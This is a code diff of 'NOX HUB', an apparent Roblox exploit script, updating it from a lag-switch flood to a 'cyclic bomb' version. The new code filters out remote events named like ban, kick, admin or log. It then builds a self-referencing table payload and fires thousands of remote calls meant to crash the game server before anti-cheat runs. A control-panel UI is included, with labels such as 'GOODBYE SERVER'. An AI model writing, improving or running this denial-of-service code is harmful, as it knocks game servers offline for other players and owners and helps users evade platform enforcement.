@@ -1,12 +1,12 @@
 --[[
-    🔱 NOX HUB v26.0 [GHOST-PROTOCOL] 🔱
-    "You can't kill what you can't see."
+    🔱 NOX HUB v28.0 [EVENT-HORIZON] 🔱
+    "The point of no return. Crash before they catch you."
     
-    GHOST FEATURES:
-    - [PURE REMOTE STACK] : Removes ALL physical movement packets (Fixed v25 Kick).
-    - [INNOCENT PAYLOAD] : Sends 'true' or 'nil'. Invisible to anti-cheat sanitizers.
-    - [SILENT ACCUMULATION] : Stacks 100,000 requests in memory without touching FPS.
-    - [GHOST RELEASE] : Fires the stack in random batches to simulate lag bursts.
+    HORIZON FEATURES:
+    - [CYCLIC FUSION] : Combines Lag Switch with Recursive Tables.
+    - [SERIALIZATION LOCK] : Forces server to infinite-loop while unpacking data.
+    - [BAN EVASION] : Server freezes BEFORE running ban logic.
+    - [COMMAND CENTER] : Premium UI retained.
 ]]
 
 -- // CORE SERVICES //
@@ -16,7 +16,7 @@ local CoreGui = game:GetService("CoreGui")
 local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
--- // 1. GHOST ENGINE //
+-- // 1. HORIZON ENGINE //
 local Engine = {
     Active = false,
     Targets = {},
@@ -29,42 +29,45 @@ function Engine:Scan()
         if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
             local n = v.Name:lower()
             -- ULTRA SAFE FILTER
-            -- We avoid anything that sounds like "Admin", "Ban", "Kick", "Security"
-            if not (n:find("ban") or n:find("kick") or n:find("admin") or n:find("sec") or n:find("check")) then
+            if not (n:find("ban") or n:find("kick") or n:find("admin") or n:find("log")) then
                  table.insert(Engine.Targets, v)
             end
         end
     end
 end
 
-function Engine:Haunt(duration, updateCallback)
+function Engine:Horizon(duration, updateCallback)
     if Engine.Active then return end
     Engine.Active = true
     Engine.Buffer = {}
     
     Engine:Scan()
     
+    -- THE PAYLOAD (CYCLIC BOMB)
+    -- This table, when serialized by Roblox, causes massive recursion or errors.
+    local Cycle = {}
+    Cycle[1] = Cycle
+    Cycle[2] = {}
+    Cycle[2][1] = Cycle
+    local Payload = table.create(10, Cycle) 
+    
     task.spawn(function()
         local StartTime = tick()
         local EndTime = StartTime + duration
         
-        -- THE GHOST LOAD (100% Silent Reqeuests via Coroutines)
-        -- We prepare functions that contain the FireServer call, but we don't call them.
-        -- We just store the function itself.
-        
+        -- PHASE 1: SILENT ACCUMULATION
         while tick() < EndTime do
             local remaining = math.ceil(EndTime - tick())
-            updateCallback(remaining, "GHOSTING... ("..#Engine.Buffer.." SPIRITS)")
+            updateCallback(remaining, "CHARGING SINGULARITY... ("..#Engine.Buffer..")")
             
-            -- Fill Buffer
-            for i = 1, 500 do -- 500 per tick
+            -- Fill Buffer with Cyclic Calls
+            for i = 1, 200 do -- Lower count, HIGHER impact
                 local r = Engine.Targets[math.random(1, #Engine.Targets)]
                 if r then
-                    -- We create a closure that holds the malicious intent
                     table.insert(Engine.Buffer, function()
                         pcall(function()
-                            if r:IsA("RemoteEvent") then r:FireServer(true) -- 'true' is harmless but takes RAM
-                            else r:InvokeServer(true) end
+                            if r:IsA("RemoteEvent") then r:FireServer(Payload)
+                            else r:InvokeServer(Payload) end
                         end)
                     end)
                 end
@@ -72,17 +75,18 @@ function Engine:Haunt(duration, updateCallback)
             RunService.Heartbeat:Wait()
         end
         
-        -- THE MANIFESTATION (Release)
-        updateCallback(0, "MANIFESTATION")
-        game:GetService("StarterGui"):SetCore("SendNotification", {Title="GHOST", Text="RELEASING..."})
+        -- PHASE 2: EVENT HORIZON
+        updateCallback(0, "EVENT HORIZON REACHED")
+        game:GetService("StarterGui"):SetCore("SendNotification", {Title="NOX", Text="GOODBYE SERVER."})
         
-        -- Fire the buffer in blocks to emulate a massive lag spike unfreezing
-        -- We iterate backwards to avoid table re-indexing lag
+        -- EXECUTE ALL
+        -- The hope: The first packet crashes the thread handler. The Anti-Cheat never runs.
         for i = #Engine.Buffer, 1, -1 do
             if Engine.Buffer[i] then
                 coroutine.wrap(Engine.Buffer[i])()
             end
-            if i % 1000 == 0 then RunService.Heartbeat:Wait() end -- Let chunks go through
+             -- No delay. Pure instant flood.
+             if i % 5000 == 0 then RunService.Heartbeat:Wait() end 
         end
         
         Engine.Active = false
@@ -105,7 +109,7 @@ function Nox:CreateUI()
     local Main = Instance.new("Frame", Screen)
     Main.Size = UDim2.new(0, 500, 0, 350)
     Main.Position = UDim2.new(0.5, -250, 0.5, -175)
-    Main.BackgroundColor3 = Color3.fromRGB(20, 20, 25) -- Deep Dark
+    Main.BackgroundColor3 = Color3.fromRGB(15, 10, 15) -- Void Purple/Black
     Main.BorderSizePixel = 0
     Main.ClipsDescendants = true
     
@@ -114,14 +118,14 @@ function Nox:CreateUI()
     
     local TopBar = Instance.new("Frame", Main)
     TopBar.Size = UDim2.new(1, 0, 0, 40)
-    TopBar.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+    TopBar.BackgroundColor3 = Color3.fromRGB(25, 20, 30)
     local TopCorner = Instance.new("UICorner", TopBar)
     TopCorner.CornerRadius = UDim.new(0, 6)
     
     local Title = Instance.new("TextLabel", TopBar)
-    Title.Text = "NOX COMMAND CENTER v27.0"
+    Title.Text = "NOX EVENT HORIZON v28.0"
     Title.Font = Enum.Font.GothamBold
-    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.TextColor3 = Color3.fromRGB(180, 100, 255)
     Title.TextSize = 14
     Title.Size = UDim2.new(0.5, 0, 1, 0)
     Title.Position = UDim2.new(0.05, 0, 0, 0)
@@ -130,9 +134,9 @@ function Nox:CreateUI()
     
     -- TABS
     local Tabs = Instance.new("Frame", Main)
-    Tabs.Size = UDim2.new(0.25, 0, 0.85, 0) -- Left Sidebar
+    Tabs.Size = UDim2.new(0.25, 0, 0.85, 0) 
     Tabs.Position = UDim2.new(0, 0, 0.15, 0)
-    Tabs.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    Tabs.BackgroundColor3 = Color3.fromRGB(20, 15, 25)
     Tabs.BorderSizePixel = 0
     
     local function CreateTabBtn(text, order, callback)
@@ -140,17 +144,15 @@ function Nox:CreateUI()
         btn.Size = UDim2.new(1, 0, 0, 40)
         btn.Position = UDim2.new(0, 0, 0, (order-1)*40)
         btn.Text = text
-        btn.TextColor3 = Color3.fromRGB(150, 150, 150)
-        btn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+        btn.TextColor3 = Color3.fromRGB(150, 100, 150)
+        btn.BackgroundColor3 = Color3.fromRGB(20, 15, 25)
         btn.Font = Enum.Font.GothamMedium
         btn.BorderSizePixel = 0
         
         btn.MouseButton1Click:Connect(function()
-            -- Reset all tabs
-            for _, c in pairs(Tabs:GetChildren()) do if c:IsA("TextButton") then c.TextColor3 = Color3.fromRGB(150, 150, 150) c.BackgroundColor3 = Color3.fromRGB(25, 25, 30) end end
-            -- Highlight this
+            for _, c in pairs(Tabs:GetChildren()) do if c:IsA("TextButton") then c.TextColor3 = Color3.fromRGB(150, 100, 150) c.BackgroundColor3 = Color3.fromRGB(20, 15, 25) end end
             btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-            btn.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+            btn.BackgroundColor3 = Color3.fromRGB(40, 20, 50)
             callback()
         end)
         return btn
@@ -168,45 +170,45 @@ function Nox:CreateUI()
     PageAttack.BackgroundTransparency = 1
     
     local StatusLbl = Instance.new("TextLabel", PageAttack)
-    StatusLbl.Text = "STATUS: IDLE"
+    StatusLbl.Text = "READY TO COLLAPSE"
     StatusLbl.Size = UDim2.new(1, 0, 0, 30)
     StatusLbl.Position = UDim2.new(0, 0, 0.1, 0)
-    StatusLbl.TextColor3 = Color3.fromRGB(100, 255, 100)
+    StatusLbl.TextColor3 = Color3.fromRGB(200, 100, 255)
     StatusLbl.Font = Enum.Font.Code
     StatusLbl.BackgroundTransparency = 1
     
     local BufferBarBg = Instance.new("Frame", PageAttack)
     BufferBarBg.Size = UDim2.new(0.8, 0, 0.05, 0)
     BufferBarBg.Position = UDim2.new(0.1, 0, 0.3, 0)
-    BufferBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    BufferBarBg.BackgroundColor3 = Color3.fromRGB(40, 30, 50)
     local BarCorner = Instance.new("UICorner", BufferBarBg)
     
     local BufferBarFill = Instance.new("Frame", BufferBarBg)
     BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
-    BufferBarFill.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
+    BufferBarFill.BackgroundColor3 = Color3.fromRGB(150, 50, 255)
     local FillCorner = Instance.new("UICorner", BufferBarFill)
     
     local MainBtn = Instance.new("TextButton", PageAttack)
     MainBtn.Size = UDim2.new(0.6, 0, 0.2, 0)
     MainBtn.Position = UDim2.new(0.2, 0, 0.6, 0)
-    MainBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 200)
-    MainBtn.Text = "START GHOST ATTACK (15s)"
+    MainBtn.BackgroundColor3 = Color3.fromRGB(80, 20, 100)
+    MainBtn.Text = "INITIATE EVENT HORIZON (15s)"
     MainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     MainBtn.Font = Enum.Font.GothamBold
     local BtnCorner = Instance.new("UICorner", MainBtn)
     
     MainBtn.MouseButton1Click:Connect(function()
         if not Engine.Active then
-            Engine:Haunt(15, function(timeLeft, txt)
+            Engine:Horizon(15, function(timeLeft, txt)
                 StatusLbl.Text = txt
                 local progress = (15 - timeLeft) / 15
                 BufferBarFill.Size = UDim2.new(progress, 0, 1, 0)
                 
                 if timeLeft == 0 then
-                   MainBtn.Text = "START GHOST ATTACK (15s)"
+                   MainBtn.Text = "INITIATE EVENT HORIZON (15s)"
                    BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
                 else
-                   MainBtn.Text = "GHOSTING... " .. timeLeft
+                   MainBtn.Text = "CHARGING... " .. timeLeft
                 end
             end)
         end
@@ -221,35 +223,24 @@ function Nox:CreateUI()
     local GraphFrame = Instance.new("Frame", PageVisuals)
     GraphFrame.Size = UDim2.new(0.9, 0, 0.6, 0)
     GraphFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
-    GraphFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
-    GraphFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
+    GraphFrame.BackgroundColor3 = Color3.fromRGB(15, 10, 20)
+    GraphFrame.BorderColor3 = Color3.fromRGB(60, 40, 80)
     GraphFrame.BorderSizePixel = 1
     
-    -- Simple bar graph simulation
     for i = 1, 20 do
         local bar = Instance.new("Frame", GraphFrame)
         bar.Size = UDim2.new(0.04, 0, math.random()*0.5, 0)
         bar.Position = UDim2.new((i-1)*0.05, 0, 1 - bar.Size.Y.Scale, 0)
-        bar.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+        bar.BackgroundColor3 = Color3.fromRGB(100, 50, 200)
         bar.BorderSizePixel = 0
-        
         task.spawn(function()
             while GraphFrame.Parent do
-                -- Simulate traffic
                 local targetHeight = Engine.Active and math.random(0.8, 1) or math.random(0.1, 0.3)
                 bar:TweenSize(UDim2.new(0.04, 0, targetHeight, 0), "Out", "Quad", 0.5, true)
                 wait(0.1 + math.random()*0.2)
             end
         end)
     end
-    
-    local GraphTitle = Instance.new("TextLabel", PageVisuals)
-    GraphTitle.Text = "NETWORK TRAFFIC MONITOR"
-    GraphTitle.Position = UDim2.new(0, 0, 0.1, 0)
-    GraphTitle.Size = UDim2.new(1, 0, 0, 20)
-    GraphTitle.TextColor3 = Color3.fromRGB(150, 150, 150)
-    GraphTitle.Font = Enum.Font.Code
-    GraphTitle.BackgroundTransparency = 1
 
     -- TABS LOGIC
     CreateTabBtn("ATTACK", 1, function() PageAttack.Visible = true; PageVisuals.Visible = false end)
